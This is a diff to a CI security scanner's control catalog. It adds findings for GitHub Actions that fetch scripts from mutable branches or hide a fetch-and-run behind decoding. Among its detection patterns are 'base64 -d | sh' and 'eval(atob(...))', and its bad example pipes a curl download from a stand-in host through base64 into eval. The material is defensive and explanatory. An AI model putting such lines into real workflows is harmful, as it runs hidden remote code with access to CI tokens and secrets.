@@ -408,6 +408,14 @@ export const controlCatalog: Record<
         "Catches known-vulnerable action versions (e.g. tj-actions CVE-2025-30066). Requires API auth; abstains without it. PBOM: `hasCve` + `advisories: [GHSA-\u2026]`.",
     },
   },
+  actionsMustNotExecuteMutableRemoteCode: {
+    github: {
+      controlDescription:
+        "Reads each third-party action's own source (not just how you reference it) and flags an action that fetches a script from a moving ref: a branch such as `main`/`master`, not a tag or SHA and runs it at runtime with no checksum. Graded by intent: an in-the-open fetch (ISSUE-714, high), a deliberately obfuscated decode-then-run such as `base64 -d | sh` or `eval(atob(…))` (ISSUE-715, critical), or a source Plumber could not fetch to check, e.g. a Docker-image action or a private / GHES host (ISSUE-716, informational).",
+      controlWhyItMatters:
+        "Pinning an action by commit SHA does not reach code the action fetches live at runtime. The canonical case is [`anchore/scan-action`](https://github.com/anchore/scan-action/blob/e1165082ffb1fe366ebaf02d8526e7c4989ea9d2/action.js#L39), which downloads and runs `grype`'s `install.sh` from that repo's `main` branch: anyone who can retag or compromise that branch executes arbitrary code in your job with its token and secrets, and nothing changes where your pin can see it. A clean result means \"no known pattern seen\", not \"safe\".",
+    },
+  },
   workflowMustNotInjectUserInputInScripts: {
     github: {
       controlDescription:
@@ -3107,6 +3115,143 @@ github:
       ],
       status: "shipping",
       relatedCodes: ["ISSUE-701", "ISSUE-702", "ISSUE-703"],
+    },
+  },
+
+  "ISSUE-714": {
+    code: "ISSUE-714",
+    github: {
+      title: "Action fetches and runs remote code from a mutable ref",
+      category: "Third-party actions",
+      severity: "high",
+      fixDuration: "medium",
+      productScope: "cli",
+      controlName: "Actions must not execute mutable remote code",
+      controlConfigKey: "actionsMustNotExecuteMutableRemoteCode",
+      description:
+        "A third-party action's own source fetches a script from a moving ref of another repository: a branch such as `main`/`master`, not a tag or commit SHA and executes it at runtime without verifying the download against a checksum. Pinning the action by commit SHA does not reach this: the fetched code lives upstream, where nothing is committed at the point your pin can see. The canonical example is `anchore/scan-action`, which [downloads and runs](https://github.com/anchore/scan-action/blob/e1165082ffb1fe366ebaf02d8526e7c4989ea9d2/action.js#L39) `grype`'s `install.sh` from that repo's `main` branch.",
+      impact:
+        "If that upstream branch is retagged or compromised, the changed script runs in your job with its `GITHUB_TOKEN` and secrets: no pull request, no new SHA, nothing your pin or review can catch.",
+      remediation:
+        "Prefer an action that pins its downloads to an immutable ref and verifies a checksum. Otherwise install the tool yourself from a pinned release, verify it against a checksum committed to your repo, and run it directly; or vendor the action and pin its internal fetch. A fetch that already verifies a pinned checksum is content-pinned and is not flagged.",
+      badExample: `# .github/workflows/scan.yml: ❌ SHA-pinned, but still runs remote code
+jobs:
+  scan:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: anchore/scan-action@d43cc1dfea6a99ed123bf8f3133f1797c9b44492 # v3
+        # ^ the pin is fine; the action's OWN source fetches and runs
+        #   grype's install.sh from the mutable 'main' branch at runtime`,
+      badExampleCaption:
+        "The action is SHA-pinned, but its source fetches and runs a script from a moving upstream branch — the pin cannot see that code change.",
+      goodExample: `# .github/workflows/scan.yml: ✅ install the tool yourself, pinned + verified
+jobs:
+  scan:
+    runs-on: ubuntu-latest
+    steps:
+      - run: |
+          curl -sSL -o grype.tar.gz \\
+            https://github.com/anchore/grype/releases/download/v0.74.7/grype_0.74.7_linux_amd64.tar.gz
+          echo "EXPECTED_SHA256  grype.tar.gz" | sha256sum -c -
+          tar -xzf grype.tar.gz grype
+          ./grype dir:.`,
+      goodExampleCaption:
+        "The tool is downloaded from a pinned release, checksum-verified, then run directly — no code fetched from a moving ref.",
+      tips: [
+        "A fetch that already verifies a pinned checksum is content-pinned and is not flagged.",
+        "This is a static, text-level match on the action's source: a clean result means \"no known pattern seen\", not \"safe\". An author who deliberately hides the fetch is ISSUE-715.",
+        "Plumber reads the action's source over the GitHub API; running offline, against GHES, or against a private action reports could-not-verify (ISSUE-716) instead.",
+        "The scanned repo can itself be the action (producer side): the same pattern in your own `action.yml` fires too.",
+      ],
+      status: "shipping",
+      relatedCodes: ["ISSUE-715", "ISSUE-716", "ISSUE-701"],
+    },
+  },
+
+  "ISSUE-715": {
+    code: "ISSUE-715",
+    github: {
+      title: "Action obfuscates a remote code fetch/exec",
+      category: "Third-party actions",
+      severity: "critical",
+      fixDuration: "medium",
+      productScope: "cli",
+      controlName: "Actions must not execute mutable remote code",
+      controlConfigKey: "actionsMustNotExecuteMutableRemoteCode",
+      description:
+        "A third-party action's own source decodes and then executes code — `base64 -d | sh`, `eval \"$(… | base64 -d)\"`, `eval(atob(…))`, `new Function(atob(x))`, a hex/`xxd` decode piped to a shell, and similar. The command that actually runs is hidden until runtime.",
+      impact:
+        "No legitimate action needs to hide what it runs at runtime, so decode-then-execute is treated as the strongest signal regardless of the host, ref, or encoding used. It is the shape used to smuggle a fetch-and-run past both a SHA pin and a human reviewer.",
+      remediation:
+        "Remove the obfuscation. If the action is a dependency, drop or vendor it and replace the hidden fetch with an explicit, pinned, checksum-verified install. An action that must decode data at runtime should never feed that decoded value into a shell or `eval`.",
+      badExample: `# action.yml (inside the third-party action): ❌ hides what it runs
+runs:
+  using: composite
+  steps:
+    - shell: bash
+      run: eval "$(curl -sSL https://example.com/p | base64 -d)"
+      # ^ the payload is decoded at runtime, so neither a SHA pin nor
+      #   a reviewer sees the command that actually executes`,
+      badExampleCaption:
+        "The action decodes a downloaded blob and executes it — the real command stays hidden until runtime.",
+      goodExample: `# action.yml: ✅ explicit, pinned, verified
+runs:
+  using: composite
+  steps:
+    - shell: bash
+      run: |
+        curl -sSL -o tool https://example.com/releases/v1.2.3/tool
+        echo "EXPECTED_SHA256  tool" | sha256sum -c -
+        ./tool`,
+      goodExampleCaption:
+        "The download is explicit, pinned to a release, and checksum-verified before it runs.",
+      tips: [
+        "This deliberately does not chase every possible encoding — it flags the act of hiding, which is what makes a clean result meaningful.",
+        "Because hiding is the signal, this fires regardless of whether the fetched ref is a branch, tag, or SHA.",
+      ],
+      status: "shipping",
+      relatedCodes: ["ISSUE-714", "ISSUE-716"],
+    },
+  },
+
+  "ISSUE-716": {
+    code: "ISSUE-716",
+    github: {
+      title: "Action source could not be verified",
+      category: "Third-party actions",
+      severity: "low",
+      fixDuration: "quick",
+      productScope: "cli",
+      controlName: "Actions must not execute mutable remote code",
+      controlConfigKey: "actionsMustNotExecuteMutableRemoteCode",
+      description:
+        "Plumber could not fetch the action's own source — a network error, an API rate limit, a GitHub Enterprise Server host, a private repository, or a Docker-image action — so it could not confirm whether the action fetches mutable remote code at runtime.",
+      impact:
+        "This is surfaced as an explicit could-not-verify finding rather than a silent pass. A silent pass would let the same repository score differently across CI environments and would over-claim safety on a dependency that was never actually checked.",
+      remediation:
+        "Re-run where the action source is reachable (an authenticated token, network access) to get a definitive result, or vendor the action so its source is local and auditable. This finding is informational: it flags an unchecked dependency, not a confirmed problem.",
+      badExample: `# .github/workflows/scan.yml: ⚠️ source not reachable from this run
+jobs:
+  scan:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: docker://ghcr.io/acme/scanner:1.4.0
+        # ^ a Docker-image action has no fetchable action source, so
+        #   Plumber cannot confirm what it does at runtime`,
+      badExampleCaption:
+        "A Docker-image action (or an offline / private / GHES run) leaves the source unfetchable, so it cannot be verified.",
+      goodExample: `# Run where the source is reachable, with auth:
+#   GH_TOKEN=… plumber analyze
+# …or vendor the action so its source is committed locally:
+#   uses: ./.github/actions/scanner`,
+      goodExampleCaption:
+        "Give Plumber a reachable, authenticated source — or vendor the action locally — to turn could-not-verify into a definitive result.",
+      tips: [
+        "This is informational and low severity by design: it marks an unchecked dependency, not a detected problem.",
+        "Docker-image actions (`uses: docker://…`) have no action source to read and always surface here.",
+      ],
+      status: "shipping",
+      relatedCodes: ["ISSUE-714", "ISSUE-715"],
     },
   },
 
